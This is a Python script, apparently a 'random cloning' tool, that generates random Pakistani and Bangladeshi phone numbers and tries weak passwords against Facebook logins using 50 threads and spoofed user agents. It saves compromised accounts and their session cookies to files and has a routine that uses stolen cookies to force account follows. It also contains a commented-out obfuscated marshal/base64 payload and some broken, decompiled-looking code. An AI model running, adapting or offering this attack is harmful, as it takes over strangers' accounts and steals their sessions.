
import os
import sys
import time
import requests
import uuid
import marshal, base64, zlib
os.system('clear')
def o():
    os.system('clear')
    print(logo)
    ip = requests.get("https://api.ipify.org").text
    jalan("     \033[1;33m[🔰\033[1;33m] \033[92;1mIP ADDRES \033[38;5;196m: \33[m\033[1;91m\033[38;5;46m\033[38;5;46m"+ip)
    print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
    jalan("     \033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mSTART RANDOM CLONING   ")
    print("     \033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mJOIN MY GROUP ")
    Mahin = input('     \033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect menu \033[38;5;196m: ')
    if Mahin == '1':
        i()
    if Mahin == '2':
        os.system('xdg-open https://facebook.com/groups/3139195683051353/')
    if Mahin == 'E':
        os.system('exit')
        return None
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)

def back():
	login()
Mahin="Mahin"
imt="SETU"
ak="CLASS3-"
myid=uuid.uuid4().hex[:8].upper()

            
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
bi = random.choice([M,N,K,B,U])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo=("""
        \x1b[38;5;196m███╗   ███╗\033[33;1m███████╗\033[38;5;46m████████╗ \033[1;34m█████╗ 
        \x1b[38;5;196m████╗ ████║\033[33;1m██╔════╝\033[38;5;46m╚══██╔══╝\033[1;34m██╔══██╗
        \x1b[38;5;196m██╔████╔██║\033[33;1m█████╗    \033[38;5;46m ██║   \033[1;34m███████║
        \x1b[38;5;196m██║╚██╔╝██║\033[33;1m██╔══╝     \033[38;5;46m██║   \033[1;34m██╔══██║
        \x1b[38;5;196m██║ ╚═╝ ██║\033[33;1m███████╗   \033[38;5;46m██║   \033[1;34m██║  ██║
        \x1b[38;5;196m╚═╝     ╚═╝\033[33;1m╚══════╝   \033[38;5;46m╚═╝   \033[1;34m╚═╝  ╚═╝
        \033[1;91m\033[1;41m\033[1;97m           MR-META-404-CYBER        \033[;0m\033[1;91m\033[1;92m
 \033[1;93m**************************************************
 \033[1;93m|     \033[1;96m[🔰] CREATED BY\33[0;m   :  \033[1;96mMR-META               \033[1;93m|
 \033[1;93m|     \033[1;32m[🔰] FACEBOK      : \033[1;34m MR-META-404-CYBER     \033[1;93m|
 \033[1;93m|     \033[1;35m[🔰] GITHUB       :  \033[1;35mMR-META-404-CYBER     \033[1;93m|
 \033[1;93m|     \033[1;36m[🔰] TOOL STATUS  : \033[1;36m RANDOM CLONING        \033[1;93m|
 \033[1;93m|     \033[1;36m[🔰] TOOL VIRSION :  \033[1;36m1.0.8                 \033[1;93m|
 \033[1;93m**************************************************""")
try:
    print("\033[38;5;46m\nTOOL UPDATE SUCCESSFUL\n")
    time.sleep(2)
    Mahin()
    print("\033[38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    Mahin()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')


loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
        os.system("espeak \"Wall come sir, BD RANDOM TOOLS  loading  PLEASE WAIT \"")
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]

for xd in range(98605):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
#exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyNU81rG0cUn9kP7a5WIq0bqtqJqWjJQQRLsr5sGUcg2ZIhTVTyBXXBNWvNxtpY1qq7q7oVu7AFH4RxsQstDS2hOhkXBxp6aY5t/gIJdBALPvUfUHEPxqfOrBNZLjp0dvbNzm/ee7/3sfMXGBrU6/UkiMUPAIFt8CkGZXCA90cDNQgQfABCVGnYlsMvTWyb0LWFFkCUBRFtUYjZBsaQaguCEcOkDjB+NDhb/A+rRZv0Ilj5zmIM9sJq2O8TesDAjGYwmQOc49GbPAFiL++TwGKRxwQ/AcQ9oy0P4pGgQItDvAnxyiOvyeJVMLxD2XhGcnlM3hSeiwc4pqNBXJb3f1lyIyxFBMhzOV4IquKHYBrozBb1Jb0MtiAEyxiFYPd7BHCPfMVGODWdmpmdTc9G43PZ7FJto1AsLhhLhbtruYV7M7VH2idrXxQf1LP3yzG0UYw63uRsKppIp6Mz6QYX0VFJ0lBpuGOk+u/g92QekE6vAxOsjFvQhK1R6ZCYL/X114AJv6V2J3B0sEGHa1+FoMPLVaRvKUY5RDlUOOrAxzrJMRg8Exfzdz8uBheWc/n7Z975iqIbJXWzlmkE1lQjPF9RS1JFz4QvDnhsp4ewsEHbXzif+9kX2d9v/3b7Zb2TyHcTeQw1pcHpCYnKobS1xvWyYdT0uUhEqilhQ67I65q0GVa19Qgma/gjOg5zUS3VN+Wq4XClsmSsKogULD09E8Mz4fDo9TFOhEGSITnsY6Ui6yHOoVTd4UiYSNEcRq3JVYepSUbZYZ6oStXhNfnzuqwbOkZV3Qj5HAGTrhrqhlzVfCRC8bwXq66RQNyuEncOQz41cv8cuq5VHJbwxrQrGNDectF1GWvh4A3d51b1Ymi8q4CZtCD+ItdGD0BSvJ7/lj3eEwN2oHflPftazy3Vs7GfJ36caH3UGY92x6MY6PgLXX8BK/rf7QMPlXKF/fCYE7/J7S7t3dm58/RaC3V8N7u+m4cPO1ysy8X6gKVTL6Qel2kpbS5zPu34H0r73ko7/9nLek8Y219q89ftRM97dV9qvm8nj4W39yZ3Jvf11tXDR83JjhDvCnE7fuwd25vamXpKt24c1ptTHW+y603aib6IGVwaV/xNxD/gEjZKnJ6ejoT79JvMdPLf/zmZ9edS7KsUk5sTXt2CWBZD0K3fL0Aj99ut6hk/v6miekXOaB+4VxWX9gYWfRpC2OdFiF0OxASAjE1/zW6ztvu4bv4FuCdP5Q=='))))    
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("            \033[1;92m8 DIGIT \033[1;95mCLONING \033[97;1m[\033[92;1mENJOY\033[97;1m]")
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    print('    \033[97;1m[\033[92;1m🔥\033[97;1m]\033[38;5;46mPK CODE    \033[38;5;196m:\033[1;97m 92301 92302 92303 92305')
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    print('    \033[97;1m[\033[92;1m🔥\033[97;1m]\033[38;5;46mBD CODE    \033[38;5;196m:\033[1;97m 88016 88017 88018 88019')
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    code = input('    \033[38;5;196mINPUT CODE \033[1;97m: ')
    print("")
    os.system('clear')
    print(logo)
    print("             \033[1;97m[\033[1;33mMR-META-404-CYBER\033[1;97m]")
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    print("    \033[97;1m[\033[92;1m✔️\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m , \033[1;34m20000\033[1;97m , \033[1;32m30000")
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    limit = int(input("    \033[97;1m[\033[92;1m?\033[97;1m] \033[1;97mCRACK ID LIMIT \033[38;5;196m: \033[1;32m"))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as setu:
        clear()
        tl = str(len(user))
        jalan('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[92;1mAGENTS    \033[38;5;196m: \033[1;32m'+str(len(ugen)))
        jalan('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
        jalan('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
        print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
        jalan("     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE✈️")
        print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
        for love in user:
            pwx = [love,'bangladesh','i love you']
            uid = code+love
            setu.submit(rcrack,uid,pwx,tl)
    print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'method':'GET',
            'path':'/?tbua=1',
            'scheme':'https',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://p.facebook.com',
            'referer': 'https://p.facebook.com/',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-asbd-id': '198387',
            'x-fb-lsd': 'AVpmztaCcEM',
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[MR-META-OK[🔥] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES[💉] : \033[38;5;46m'+coki+ ' ')                
                open('/sdcard/MR-META-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;196m[MR-META-CP[😪] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/MR-META-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[1;93m[\33[m-META\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

o()